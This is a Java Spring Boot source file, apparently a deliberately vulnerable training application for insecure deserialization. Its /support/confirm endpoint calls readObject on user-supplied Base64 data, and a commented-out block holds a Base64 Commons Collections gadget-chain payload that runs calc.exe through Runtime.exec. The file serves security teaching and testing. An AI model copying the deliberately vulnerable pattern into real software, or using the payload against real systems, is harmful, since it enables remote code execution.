package pl.securitum.deserialization.DamnVulnerableSpring;

import org.apache.commons.collections.Factory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.apache.commons.collections.list.LazyList;

import java.io.*;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Date;
import java.util.List;

@SpringBootApplication
@RestController
public class DamnVulnerableSpringApplication {

	public static void main(String[] args)  throws IOException, ClassNotFoundException {
		SpringApplication.run(DamnVulnerableSpringApplication.class, args);

		Factory factory = new Factory() {
			public Object create() {
				return new Date();
			}
		};

//		String confirmation = "rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAACHcIAAAACwAAAAJzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AFwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABdzcQB+AA91cQB+ABQAAAACcHVxAH4AFAAAAAB0AAZpbnZva2V1cQB+ABcAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAUc3EAfgAPdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AFwAAAAFxAH4AHHNxAH4ACnNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAJ5eXEAfgAveHhxAH4AL3NxAH4AAnEAfgAHc3EAfgAwP0AAAAAAAAx3CAAAABAAAAABdAACelpxAH4AL3h4c3EAfgAtAAAAAng=";
//		byte[] data = Base64.getDecoder().decode(confirmation);
//		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
//		Object ticket = ois.readObject();

		List lazy = LazyList.decorate(new ArrayList(), factory);
		Object obj = lazy.get(3);
		System.out.println(obj);
	}

	@PostMapping({"/support"})
	public String createSupportTicket(@RequestParam String problem, @RequestParam String description) throws IOException {
		TicketModel ticket = new TicketModel(problem, description);
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(ticket);
		oos.close();
		return Base64.getEncoder().encodeToString(baos.toByteArray());
	}

	@PostMapping({"/support/confirm"})
	public String confirmSupportTicket(@RequestParam String confirmation) throws IOException, ClassNotFoundException {
		byte[] data = Base64.getDecoder().decode(confirmation);
		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
		Object ticket = ois.readObject();
		ois.close();
		return "confirmed";
	}
}
